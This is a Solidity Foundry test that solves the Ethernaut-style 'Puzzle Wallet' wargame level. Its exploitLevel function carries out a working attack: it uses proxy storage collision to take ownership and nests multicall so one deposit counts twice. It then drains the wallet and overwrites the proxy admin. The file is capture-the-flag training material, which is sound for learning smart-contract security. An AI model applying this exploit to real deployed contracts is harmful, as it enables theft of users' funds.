// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "../src/levels/PuzzleWallet.sol";
import "../src/levels/PuzzleWalletFactory.sol";
import "./utils/BaseTest.sol";

contract TestPuzzleWallet is BaseTest{
    PuzzleProxy private level;
    PuzzleWallet puzzleWallet;
    constructor() public{
        levelFactory = new PuzzleWalletFactory();
    }

    function setUp() public override{
        super.setUp();
    }
    function testRunLevel() public{
        runLevel();
    }
   function setupLevel() internal override{
        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = PuzzleProxy(levelAddress);
        puzzleWallet = PuzzleWallet(address(level));

        assertEq(level.admin(), address(levelFactory));   

    }

    function exploitLevel() internal override{
        vm.startPrank(player);
        //we become owner of puzzleWallet contract
        level.proposeNewAdmin(player);

        //add whitelist to use contract
        puzzleWallet.addToWhitelist(player);

        //now we need to set maxBalance variable but for that we need to drain all fund of walletContract 
        //so we create multi level multi call for to call multiple time deposite function 

        bytes[] memory level2call = new bytes[](1);
        level2call[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);

        bytes[] memory level1call = new bytes[](2);
        level1call[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        level1call[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector,level2call);

        //now call multicall function of puzzleWallet contract with level1call
        puzzleWallet.multicall{value:0.001 ether}(level1call);      
        //we want to drain 0.001 ether from this contract which we have deposited while deploying this contract

        //above multicall will update the state variable with balance[player] = 0.002 ether 
        //as we are creating sub level multi call to manipulate deposit function call
        puzzleWallet.execute(player, 0.002 ether, "");

        puzzleWallet.setMaxBalance(uint256(player));

        assertEq(level.admin(), player);
        vm.stopPrank();
    }
}